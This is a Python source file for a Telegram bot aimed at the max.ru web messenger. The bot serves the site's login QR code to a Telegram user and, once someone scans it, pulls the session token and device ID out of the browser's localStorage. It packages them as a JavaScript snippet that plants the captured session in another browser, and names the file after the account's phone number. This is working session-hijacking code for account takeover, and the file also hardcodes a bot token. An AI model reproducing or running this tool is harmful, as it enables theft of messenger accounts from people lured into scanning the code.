"""
Telegram бот для max.ru - БАЗОВАЯ ВЕРСИЯ (БЕЗ ПРОКСИ)
"""

import logging
import asyncio
from io import BytesIO
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import json
import re

# ==================== ТВОЙ НОВЫЙ ТОКЕН ====================
TOKEN = "8556187422:AAEibIikC64cpyXbJMeTljkibtkl7j0fJgs"
URL = "https://web.max.ru"
# ========================================================

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Глобальный драйвер
driver = None
user_sessions = {}

def create_driver():
    """Создает новый драйвер без прокси"""
    options = Options()
    
    # Базовые настройки для работы на Render
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-extensions')
    options.add_argument('--window-size=1280x720')
    
    # Оптимизация загрузки
    options.page_load_strategy = 'eager'
    
    # Добавляем user-agent
    options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    
    # Автоматическое управление драйвером
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        logger.info("✅ Драйвер успешно создан")
        return driver
    except Exception as e:
        logger.error(f"❌ Ошибка создания драйвера: {e}")
        raise e

def extract_phone_number(auth_data):
    """Пытается извлечь номер телефона из auth данных"""
    try:
        if isinstance(auth_data, str):
            data = json.loads(auth_data)
        else:
            data = auth_data
        
        phone = None
        
        # Проверяем разные поля
        if 'phone' in data:
            phone = data['phone']
        elif 'phoneNumber' in data:
            phone = data['phoneNumber']
        elif 'user' in data and isinstance(data['user'], dict):
            if 'phone' in data['user']:
                phone = data['user']['phone']
        elif 'viewerId' in data:
            phone = str(data['viewerId'])
        elif 'token' in data:
            token = data['token']
            phone_match = re.search(r'\d{10,11}', token)
            if phone_match:
                phone = phone_match.group()
        
        if phone:
            phone = re.sub(r'\D', '', str(phone))
            if len(phone) > 10:
                phone = phone[-10:]
            return phone
        
        return None
    except Exception as e:
        logger.error(f"Ошибка извлечения номера: {e}")
        return None

async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение QR-кода"""
    global driver
    user_id = str(update.effective_user.id)
    
    msg = await update.message.reply_text("⚡️ Получаю QR-код...")
    
    try:
        # Закрываем старый драйвер если есть
        if driver:
            try:
                driver.quit()
                logger.info("Старый драйвер закрыт")
            except:
                pass
        
        # Создаем новый драйвер
        await msg.edit_text("🔄 Запускаю браузер...")
        driver = create_driver()
        
        # Загружаем страницу
        await msg.edit_text("📱 Загружаю страницу...")
        driver.get(URL)
        time.sleep(5)
        
        # Делаем скриншот
        await msg.edit_text("📸 Делаю скриншот...")
        screenshot = driver.get_screenshot_as_png()
        img_io = BytesIO(screenshot)
        img_io.name = "qr.png"
        
        await msg.delete()
        await update.message.reply_photo(
            photo=InputFile(img_io, filename="qr.png"),
            caption="✅ **QR-код готов!**\n\n👉 /file - после входа",
            parse_mode='Markdown'
        )
        
        user_sessions[user_id] = True
        logger.info(f"✅ QR отправлен пользователю {user_id}")
        
    except Exception as e:
        logger.error(f"❌ Ошибка: {e}")
        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")
        if driver:
            try:
                driver.quit()
            except:
                pass
            driver = None

async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла со скриптом"""
    global driver
    user_id = str(update.effective_user.id)
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сначала используй /qr")
        return
    
    if not driver:
        await update.message.reply_text("❌ Браузер не активен. Используй /qr")
        return
    
    msg = await update.message.reply_text("📁 Получаю данные...")
    
    try:
        # Получаем данные из localStorage
        data = driver.execute_script("""
            return {
                deviceId: localStorage.getItem('__oneme_device_id'),
                auth: localStorage.getItem('__oneme_auth')
            };
        """)
        
        if data and data['deviceId'] and data['auth']:
            # Парсим auth
            try:
                auth_data = json.loads(data['auth'])
            except:
                auth_data = {"token": data['auth'], "viewerId": "unknown"}
            
            # Пытаемся извлечь номер телефона
            phone_number = extract_phone_number(auth_data)
            
            # Форматируем JSON
            auth_str = json.dumps(auth_data, indent=2, ensure_ascii=False)
            
            # Создаем скрипт
            script = f"""sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '{data['deviceId']}');
localStorage.setItem('__oneme_auth', JSON.stringify({auth_str}));
window.location.reload();"""
            
            # Определяем имя файла
            if phone_number:
                filename = f"{phone_number}.txt"
                caption_text = f"✅ Файл для номера {phone_number}"
            else:
                filename = f"{data['deviceId'][:8]}.txt"
                caption_text = "✅ Файл готов"
            
            # Создаем файл
            file_bytes = BytesIO(script.encode('utf-8'))
            file_bytes.name = filename
            
            await msg.delete()
            await update.message.reply_document(
                document=InputFile(file_bytes, filename=filename),
                caption=caption_text
            )
            
            logger.info(f"✅ Файл {filename} отправлен пользователю {user_id}")
            
            # Закрываем браузер
            if driver:
                driver.quit()
                driver = None
            del user_sessions[user_id]
        else:
            await msg.edit_text(
                "❌ Вход не выполнен\n\n"
                "1️⃣ Отсканируй QR\n"
                "2️⃣ Войди на сайт\n"
                "3️⃣ Попробуй /file еще раз"
            )
            
    except Exception as e:
        logger.error(f"❌ Ошибка: {e}")
        await msg.edit_text(f"❌ Ошибка: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    await update.message.reply_text(
        "👋 **Бот для max.ru**\n\n"
        "⚡️ **/qr** - получить QR-код\n"
        "📁 **/file** - получить файл после входа\n"
        "🔄 **/reset** - сбросить браузер",
        parse_mode='Markdown'
    )

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Сброс браузера"""
    global driver
    user_id = str(update.effective_user.id)
    
    if driver:
        try:
            driver.quit()
            logger.info("Драйвер закрыт по команде reset")
        except:
            pass
        driver = None
    
    if user_id in user_sessions:
        del user_sessions[user_id]
    
    await update.message.reply_text("✅ Браузер сброшен")

def main():
    """Запуск бота"""
    print("="*50)
    print("🚀 ЗАПУСК БОТА MAX (БЕЗ ПРОКСИ)")
    print("="*50)
    print(f"📊 Токен: {TOKEN[:15]}...")
    print("="*50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("qr", qr_command))
    app.add_handler(CommandHandler("file", file_command))
    app.add_handler(CommandHandler("reset", reset_command))
    
    print("✅ Бот готов!")
    print("📱 Команды: /qr /file /reset")
    print("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
